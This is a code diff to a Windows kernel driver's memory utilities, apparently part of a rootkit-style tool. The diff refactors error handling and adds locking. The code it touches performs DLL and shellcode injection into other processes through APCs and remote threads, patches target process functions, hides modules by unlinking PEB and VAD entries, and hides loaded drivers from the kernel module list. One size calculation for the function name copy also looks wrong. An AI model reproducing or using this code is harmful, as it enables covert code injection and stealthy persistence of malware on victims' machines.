@@ -1,5 +1,6 @@
 #include "pch.h"
 #include "MemoryUtils.hpp"
+#include "MemoryAllocator.hpp"
 
 MemoryUtils::MemoryUtils() {
 	this->hiddenDrivers.Count = 0;
@@ -10,9 +11,12 @@ MemoryUtils::MemoryUtils() {
 		this->NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");
 
 	memset(this->hiddenDrivers.Items, 0, sizeof(this->hiddenDrivers.Items));
+	AutoLock lock(this->hiddenDrivers.Lock);
 }
 
 MemoryUtils::~MemoryUtils() {
+	AutoLock lock(this->hiddenDrivers.Lock);
+
 	for (ULONG i = 0; i < this->hiddenDrivers.Count; i++) {
 		RemoveHiddenDriver(i);
 	}
@@ -40,18 +44,23 @@ NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 
 	if (!NT_SUCCESS(status))
 		return status;
+
 	shellcodeSize = DLL_INJ_SHELLCODE_SIZE;
 
 	// Filling the shellcode from the template.
 	status = KeWriteProcessMemory(&shellcodeTemplate, PsGetCurrentProcess(), shellcode, shellcodeSize, KernelMode);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+	if (!NT_SUCCESS(status)) {
+		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
+		return status;
+	}
 
 	status = KeWriteProcessMemory(&(DllInfo->DllPath), PsGetCurrentProcess(), (PUCHAR)shellcode + PATH_OFFSET, sizeof(DllInfo->DllPath), KernelMode);
-
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+	
+	if (!NT_SUCCESS(status)) {
+		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
+		return status;
+	}
 
 	// Creating the shellcode information for APC injection.
 	ShellcodeInfo.Parameter1 = NULL;
@@ -62,10 +71,6 @@ NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
 	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;
 
 	status = InjectShellcodeAPC(&ShellcodeInfo);
-
-CleanUp:
-	if (!NT_SUCCESS(status) && shellcode)
-		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);
 
 	return status;
 }
@@ -93,21 +98,23 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);
 
 	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		return status;
 
 	KeStackAttachProcess(TargetProcess, &state);
 	PVOID kernel32Base = GetModuleBase(TargetProcess, L"C:\\Windows\\System32\\kernel32.dll");
 
 	if (!kernel32Base) {
 		KeUnstackDetachProcess(&state);
-		goto CleanUp;
+		ObDereferenceObject(TargetProcess);
+		return STATUS_ABANDONED;
 	}
 
 	PVOID loadLibraryAddress = GetFunctionAddress(kernel32Base, "LoadLibraryA");
 
 	if (!loadLibraryAddress) {
 		KeUnstackDetachProcess(&state);
-		goto CleanUp;
+		ObDereferenceObject(TargetProcess);
+		return STATUS_ABANDONED;
 	}
 	KeUnstackDetachProcess(&state);
 
@@ -117,19 +124,29 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 
 	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+	if (!NT_SUCCESS(status)) {
+		ObDereferenceObject(TargetProcess);
+		return status;
+	}
 
 	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &pathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+	if (!NT_SUCCESS(status)) {
+		ZwClose(hProcess);
+		ObDereferenceObject(TargetProcess);
+		return status;
+	}
+
 	pathLength = strlen(DllInfo->DllPath) + 1;
 
 	status = KeWriteProcessMemory(&(DllInfo->DllPath), TargetProcess, remoteAddress, pathLength, KernelMode);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+	if (!NT_SUCCESS(status)) {
+		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
+		ZwClose(hProcess);
+		ObDereferenceObject(TargetProcess);
+		return status;
+	}
 
 	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
 	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
@@ -139,19 +156,9 @@ NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
 	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)loadLibraryAddress, remoteAddress, 0, NULL, NULL, NULL, NULL);
 	*previousMode = tmpPreviousMode;
 
-CleanUp:
-	if (hTargetThread)
-		ZwClose(hTargetThread);
-
-	if (!NT_SUCCESS(status) && remoteAddress)
-		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);
-
-	if (hProcess)
-		ZwClose(hProcess);
-
-	if (TargetProcess)
-		ObDereferenceObject(TargetProcess);
-
+	ZwClose(hTargetThread);
+	ZwClose(hProcess);
+	ObDereferenceObject(TargetProcess);
 	return status;
 }
 
@@ -181,64 +188,67 @@ NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
 	status = PsLookupProcessByProcessId(pid, &TargetProcess);
 
 	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		return status;
 
 	// Find APC suitable thread.
 	status = FindAlertableThread(pid, &TargetThread);
 
-	if (!NT_SUCCESS(status) || !TargetThread) {
-		if (NT_SUCCESS(status))
-			status = STATUS_NOT_FOUND;
-		goto CleanUp;
-	}
+	do {
+		if (!NT_SUCCESS(status) || !TargetThread) {
+			if (NT_SUCCESS(status))
+				status = STATUS_NOT_FOUND;
+			break;
+		}
 
-	// Allocate and write the shellcode.
-	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-	cid.UniqueProcess = pid;
-	cid.UniqueThread = NULL;
+		// Allocate and write the shellcode.
+		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+		cid.UniqueProcess = pid;
+		cid.UniqueThread = NULL;
 
-	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
+		status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		if (!NT_SUCCESS(status))
+			break;
 
-	status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+		status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
-	shellcodeSize = ShellcodeInfo->ShellcodeSize;
+		if (!NT_SUCCESS(status))
+			break;
+		shellcodeSize = ShellcodeInfo->ShellcodeSize;
 
-	status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
+		status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		if (!NT_SUCCESS(status))
+			break;
 
-	// Create and execute the APCs.
-	ShellcodeApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
-	PrepareApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
+		// Create and execute the APCs.
+		ShellcodeApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
+		PrepareApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
 
-	if (!ShellcodeApc || !PrepareApc) {
-		status = STATUS_UNSUCCESSFUL;
-		goto CleanUp;
-	}
+		if (!ShellcodeApc || !PrepareApc) {
+			status = STATUS_INSUFFICIENT_RESOURCES;
+			break;
+		}
 
-	KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
-	KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);
+		KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
+		KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);
 
-	if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
-		status = STATUS_UNSUCCESSFUL;
-		goto CleanUp;
-	}
+		if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
 
-	if (!KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
-		status = STATUS_UNSUCCESSFUL;
-		goto CleanUp;
-	}
+		if (!KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
 
-	if (PsIsThreadTerminating(TargetThread))
-		status = STATUS_THREAD_IS_TERMINATING;
+		if (PsIsThreadTerminating(TargetThread))
+			status = STATUS_THREAD_IS_TERMINATING;
 
-CleanUp:
+	} while (false);
+
+
 	if (!NT_SUCCESS(status)) {
 		if (shellcodeAddress)
 			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
@@ -247,6 +257,9 @@ CleanUp:
 		if (ShellcodeApc)
 			ExFreePoolWithTag(ShellcodeApc, DRIVER_TAG);
 	}
+
+	if (TargetThread)
+		ObDereferenceObject(TargetThread);
 
 	if (TargetProcess)
 		ObDereferenceObject(TargetProcess);
@@ -279,7 +292,7 @@ NTSTATUS MemoryUtils::InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo)
 	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);
 
 	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		return status;
 
 	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
 	cid.UniqueProcess = pid;
@@ -287,29 +300,31 @@ NTSTATUS MemoryUtils::InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo)
 
 	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+	do {
+		if (!NT_SUCCESS(status))
+			break;
 
-	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+		status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
-	shellcodeSize = ShellcodeInfo->ShellcodeSize;
+		if (!NT_SUCCESS(status))
+			break;
 
-	status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);
+		shellcodeSize = ShellcodeInfo->ShellcodeSize;
+		status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);
 
-	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		if (!NT_SUCCESS(status))
+			break;
 
-	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
-	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
-	CHAR tmpPreviousMode = *previousMode;
-	*previousMode = KernelMode;
-	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
-	*previousMode = tmpPreviousMode;
+		// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
+		InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+		PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
+		CHAR tmpPreviousMode = *previousMode;
+		*previousMode = KernelMode;
+		status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
+		*previousMode = tmpPreviousMode;
 
-CleanUp:
+	} while (false);
+
 	if (hTargetThread)
 		ZwClose(hTargetThread);
 
@@ -338,59 +353,52 @@ CleanUp:
 NTSTATUS MemoryUtils::PatchModule(PatchedModule* ModuleInformation) {
 	PEPROCESS TargetProcess;
 	KAPC_STATE state;
-
 	PVOID functionAddress = NULL;
 	PVOID moduleImageBase = NULL;
+	WCHAR* moduleName = NULL;
+	CHAR* functionName = NULL;
 	NTSTATUS status = STATUS_UNSUCCESSFUL;
 
 	// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
-	WCHAR* moduleName = (WCHAR*)ExAllocatePool(PagedPool, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));
-
-	if (!moduleName)
+	SIZE_T moduleNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
+	MemoryAllocator<WCHAR*> moduleNameAllocator(moduleName, moduleNameSize, PagedPool);
+	status = moduleNameAllocator.CopyData(ModuleInformation->ModuleName, moduleNameSize);
+	
+	if (!NT_SUCCESS(status))
 		return status;
-	memcpy(moduleName, ModuleInformation->ModuleName, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));
 
-	CHAR* functionName = (CHAR*)ExAllocatePool(PagedPool, strlen(ModuleInformation->FunctionName) + 1);
+	SIZE_T functionNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
+	MemoryAllocator<CHAR*> functionNameAllocator(functionName, functionNameSize, PagedPool);
+	status = functionNameAllocator.CopyData(ModuleInformation->FunctionName, functionNameSize);
 
-	if (!functionName) {
-		ExFreePool(moduleName);
+	if (!NT_SUCCESS(status))
 		return status;
-	}
-	memcpy(functionName, ModuleInformation->FunctionName, strlen(ModuleInformation->FunctionName) + 1);
 
-	if (PsLookupProcessByProcessId((HANDLE)ModuleInformation->Pid, &TargetProcess) != STATUS_SUCCESS) {
-		ExFreePool(functionName);
-		ExFreePool(moduleName);
+	status = PsLookupProcessByProcessId((HANDLE)ModuleInformation->Pid, &TargetProcess);
+
+	if (!NT_SUCCESS(status))
 		return status;
-	}
 
 	// Getting the PEB.
 	KeStackAttachProcess(TargetProcess, &state);
 	moduleImageBase = GetModuleBase(TargetProcess, moduleName);
 
 	if (!moduleImageBase) {
-		KdPrint((DRIVER_PREFIX "Failed to get image base.\n"));
 		KeUnstackDetachProcess(&state);
-		goto CleanUp;
+		ObDereferenceObject(TargetProcess);
+		return STATUS_UNSUCCESSFUL;
 	}
 
 	functionAddress = GetFunctionAddress(moduleImageBase, functionName);
 
 	if (!functionAddress) {
-		KdPrint((DRIVER_PREFIX "Failed to get function's address.\n"));
 		KeUnstackDetachProcess(&state);
-		goto CleanUp;
+		ObDereferenceObject(TargetProcess);
+		return STATUS_UNSUCCESSFUL;
 	}
 	KeUnstackDetachProcess(&state);
 
 	status = KeWriteProcessMemory(ModuleInformation->Patch, TargetProcess, functionAddress, (SIZE_T)ModuleInformation->PatchLength, UserMode);
-
-	if (!NT_SUCCESS(status))
-		KdPrint((DRIVER_PREFIX "Failed to patch function, (0x%08X).\n", status));
-
-CleanUp:
-	ExFreePool(moduleName);
-	ExFreePool(functionName);
 	ObDereferenceObject(TargetProcess);
 	return status;
 }
@@ -408,33 +416,32 @@ CleanUp:
 NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
 	PLDR_DATA_TABLE_ENTRY pebEntry;
 	KAPC_STATE state;
-	NTSTATUS status = STATUS_UNSUCCESSFUL;
+	NTSTATUS status = STATUS_SUCCESS;
 	PEPROCESS targetProcess = NULL;
 	LARGE_INTEGER time = { 0 };
 	PVOID moduleBase = NULL;
+	WCHAR* moduleName = NULL;
 	time.QuadPart = -100ll * 10 * 1000;
 
-	WCHAR* moduleName = (WCHAR*)ExAllocatePoolWithTag(PagedPool, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR), DRIVER_TAG);
+	SIZE_T moduleNameSize = (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR);
+	MemoryAllocator<WCHAR*> moduleNameAllocator(moduleName, moduleNameSize, PagedPool);
+	status = moduleNameAllocator.CopyData(ModuleInformation->ModuleName, moduleNameSize);
 
-	if (!moduleName)
+	if (!NT_SUCCESS(status))
 		return status;
-
-	memcpy(moduleName, ModuleInformation->ModuleName, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));
 
 	// Getting the process's PEB.
 	status = PsLookupProcessByProcessId(ULongToHandle(ModuleInformation->Pid), &targetProcess);
 
-	if (!NT_SUCCESS(status)) {
-		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+	if (!NT_SUCCESS(status))
 		return status;
-	}
 
 	KeStackAttachProcess(targetProcess, &state);
 	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(targetProcess);
 
 	if (!targetPeb) {
 		KeUnstackDetachProcess(&state);
-		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		ObDereferenceObject(targetProcess);
 		return STATUS_ABANDONED;
 	}
 
@@ -444,7 +451,13 @@ NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
 
 	if (!targetPeb->LoaderData) {
 		KeUnstackDetachProcess(&state);
-		ExFreePoolWithTag(moduleName, DRIVER_TAG);
+		ObDereferenceObject(targetProcess);
+		return STATUS_ABANDONED_WAIT_0;
+	}
+
+	if (!&targetPeb->LoaderData->InLoadOrderModuleList) {
+		KeUnstackDetachProcess(&state);
+		ObDereferenceObject(targetProcess);
 		return STATUS_ABANDONED_WAIT_0;
 	}
 
@@ -457,25 +470,26 @@ NTSTATUS MemoryUtils::HideModule(HiddenModuleInformation* ModuleInformation) {
 
 		pebEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 
-		if (pebEntry->FullDllName.Length > 0) {
-			if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
-				moduleBase = pebEntry->DllBase;
-				RemoveEntryList(&pebEntry->InLoadOrderLinks);
-				RemoveEntryList(&pebEntry->InInitializationOrderLinks);
-				RemoveEntryList(&pebEntry->InMemoryOrderLinks);
-				RemoveEntryList(&pebEntry->HashLinks);
-				status = STATUS_SUCCESS;
-				break;
+		if (pebEntry) {
+			if (pebEntry->FullDllName.Length > 0) {
+				if (_wcsnicmp(pebEntry->FullDllName.Buffer, moduleName, pebEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
+					moduleBase = pebEntry->DllBase;
+					RemoveEntryList(&pebEntry->InLoadOrderLinks);
+					RemoveEntryList(&pebEntry->InInitializationOrderLinks);
+					RemoveEntryList(&pebEntry->InMemoryOrderLinks);
+					RemoveEntryList(&pebEntry->HashLinks);
+					status = STATUS_SUCCESS;
+					break;
+				}
 			}
 		}
 	}
-
 	KeUnstackDetachProcess(&state);
 
 	if (NT_SUCCESS(status))
 		status = VadHideObject(targetProcess, (ULONG_PTR)moduleBase);
 
-	ExFreePoolWithTag(moduleName, DRIVER_TAG);
+	ObDereferenceObject(targetProcess);
 	return status;
 }
 
@@ -493,6 +507,9 @@ NTSTATUS MemoryUtils::HideDriver(HiddenDriverInformation* DriverInformation) {
 	HiddenDriverItem hiddenDriver{};
 	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
 	NTSTATUS status = STATUS_NOT_FOUND;
+
+	if (!ExAcquireResourceExclusiveLite(&PsLoadedModuleResource, 1))
+		return STATUS_ABANDONED;
 
 	for (PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
 		pListEntry != &PsLoadedModuleList->InLoadOrderLinks;
@@ -518,6 +535,7 @@ NTSTATUS MemoryUtils::HideDriver(HiddenDriverInformation* DriverInformation) {
 		}
 	}
 
+	ExReleaseResourceLite(&PsLoadedModuleResource);
 	return status;
 }
 
@@ -542,12 +560,18 @@ NTSTATUS MemoryUtils::UnhideDriver(HiddenDriverInformation* DriverInformation) {
 	if (driverIndex == ITEM_NOT_FOUND)
 		return status;
 
+	if (!ExAcquireResourceExclusiveLite(&PsLoadedModuleResource, 1))
+		return STATUS_ABANDONED;
+
 	PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
 	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
 	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, (PLIST_ENTRY)(this->hiddenDrivers.Items[driverIndex].originalEntry));
 
 	if (RemoveHiddenDriver(driverIndex))
 		status = STATUS_SUCCESS;
+
+	ExReleaseResourceLite(&PsLoadedModuleResource);
+	return status;
 }
 
 /*
@@ -678,12 +702,14 @@ NTSTATUS MemoryUtils::VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress) 
 
 	// Finding the VAD node associated with the target address.
 	ULONG vadRootOffset = GetVadRootOffset();
+	ULONG pageCommitmentLockOffset = GetPageCommitmentLockOffset(); 
 
-	if (vadRootOffset == 0)
+	if (vadRootOffset == 0 || pageCommitmentLockOffset == 0)
 		return STATUS_INVALID_ADDRESS;
 
 	PRTL_AVL_TABLE vadTable = (PRTL_AVL_TABLE)((PUCHAR)Process + vadRootOffset);
-	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &node);
+	EX_PUSH_LOCK pageTableCommitmentLock = (EX_PUSH_LOCK)((PUCHAR)Process + pageCommitmentLockOffset);
+	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &node, &pageTableCommitmentLock);
 
 	if (res != TableFoundNode)
 		return STATUS_NOT_FOUND;
@@ -729,7 +755,7 @@ NTSTATUS MemoryUtils::VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress) 
 * TableFoundNode if the key is found and the OutNode is the result node
 * TableInsertAsLeft / TableInsertAsRight if the node was not found and the OutNode contains what will be the out node (right or left respectively).
 */
-TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode) {
+TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode, EX_PUSH_LOCK* PageTableCommitmentLock) {
 	PRTL_BALANCED_NODE child = NULL;
 	PRTL_BALANCED_NODE nodeToCheck = NULL;
 	PMMVAD_SHORT virtualAddressToCompare = NULL;
@@ -740,6 +766,7 @@ TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG
 	if (Table->NumberGenericTableElements == 0 && Table->DepthOfTree == 0)
 		return result;
 
+	ExAcquirePushLockExclusiveEx(PageTableCommitmentLock, 0);
 	nodeToCheck = (PRTL_BALANCED_NODE)(&Table->BalancedRoot);
 
 	while (true) {
@@ -783,6 +810,7 @@ TABLE_SEARCH_RESULT MemoryUtils::VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG
 		}
 	}
 
+	ExReleasePushLockExclusiveEx(PageTableCommitmentLock, 0);
 	return result;
 }
 
@@ -851,6 +879,9 @@ PVOID MemoryUtils::GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
 	PVOID functionAddress = NULL;
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
 
+	if (!dosHeader)
+		return functionAddress;
+
 	// Checking that the image is valid PE file.
 	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
 		KdPrint((DRIVER_PREFIX "DOS signature isn't valid.\n"));
@@ -908,24 +939,20 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	ULONG index = 0;
 	UCHAR syscall = 0;
 	HANDLE csrssPid = 0;
+
+	MemoryAllocator<PSYSTEM_PROCESS_INFO> originalInfoAllocator(originalInfo, infoSize, PagedPool);
 	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
 
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
-		if (originalInfo) {
-			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
-			originalInfo = NULL;
-		}
+		status = originalInfoAllocator.Realloc(infoSize);
 
-		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
-
-		if (!originalInfo)
+		if (!NT_SUCCESS(status))
 			return functionAddress;
-
 		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
 	}
 
 	if (!NT_SUCCESS(status) || !originalInfo)
-		goto CleanUp;
+		return functionAddress;
 
 	// Using another info variable to avoid BSOD on freeing.
 	info = originalInfo;
@@ -942,11 +969,12 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	}
 
 	if (csrssPid == 0)
-		goto CleanUp;
+		return functionAddress;
+
 	status = PsLookupProcessByProcessId(csrssPid, &CsrssProcess);
 
 	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		return functionAddress;
 
 	// Attaching to the process's stack to be able to walk the PEB.
 	KeStackAttachProcess(CsrssProcess, &state);
@@ -954,13 +982,15 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 
 	if (!ntdllBase) {
 		KeUnstackDetachProcess(&state);
-		goto CleanUp;
+		ObDereferenceObject(CsrssProcess);
+		return functionAddress;
 	}
 	PVOID ntdllFunctionAddress = GetFunctionAddress(ntdllBase, functionName);
 
 	if (!ntdllFunctionAddress) {
 		KeUnstackDetachProcess(&state);
-		goto CleanUp;
+		ObDereferenceObject(CsrssProcess);
+		return functionAddress;
 	}
 
 	// Searching for the syscall.
@@ -975,15 +1005,7 @@ PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
 	if (syscall != 0)
 		functionAddress = (PUCHAR)this->ssdt->ServiceTableBase + (((PLONG)this->ssdt->ServiceTableBase)[syscall] >> 4);
 
-CleanUp:
-	if (CsrssProcess)
-		ObDereferenceObject(CsrssProcess);
-
-	if (originalInfo) {
-		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
-		originalInfo = NULL;
-	}
-
+	ObDereferenceObject(CsrssProcess);
 	return functionAddress;
 }
 
@@ -999,7 +1021,7 @@ CleanUp:
 * @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
 */
 NTSTATUS MemoryUtils::GetSSDTAddress() {
-	ULONG infoSize;
+	ULONG infoSize = 0;
 	PVOID ssdtRelativeLocation = NULL;
 	PVOID ntoskrnlBase = NULL;
 	PRTL_PROCESS_MODULES info = NULL;
@@ -1007,24 +1029,20 @@ NTSTATUS MemoryUtils::GetSSDTAddress() {
 	UCHAR pattern[] = "\x4c\x8d\x15\xcc\xcc\xcc\xcc\x4c\x8d\x1d\xcc\xcc\xcc\xcc\xf7";
 
 	// Getting ntoskrnl base first.
+	MemoryAllocator<PRTL_PROCESS_MODULES> infoAllocator(info, infoSize, PagedPool);
 	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);
 
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
-		if (info) {
-			ExFreePoolWithTag(info, DRIVER_TAG);
-			info = NULL;
-		}
+		status = infoAllocator.Realloc(infoSize);
 
-		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
-
-		if (!info)
-			return STATUS_INSUFFICIENT_RESOURCES;
+		if (!NT_SUCCESS(status))
+			return status;
 
 		status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
 	}
 
 	if (!NT_SUCCESS(status) || !info)
-		goto CleanUp;
+		return status;
 
 	PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;
 
@@ -1036,19 +1054,20 @@ NTSTATUS MemoryUtils::GetSSDTAddress() {
 	}
 
 	if (!ntoskrnlBase)
-		goto CleanUp;
+		return STATUS_NOT_FOUND;
 
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntoskrnlBase;
 
 	// Finding the SSDT address.
 	status = STATUS_NOT_FOUND;
+
 	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
-		goto CleanUp;
+		return STATUS_INVALID_ADDRESS;
 
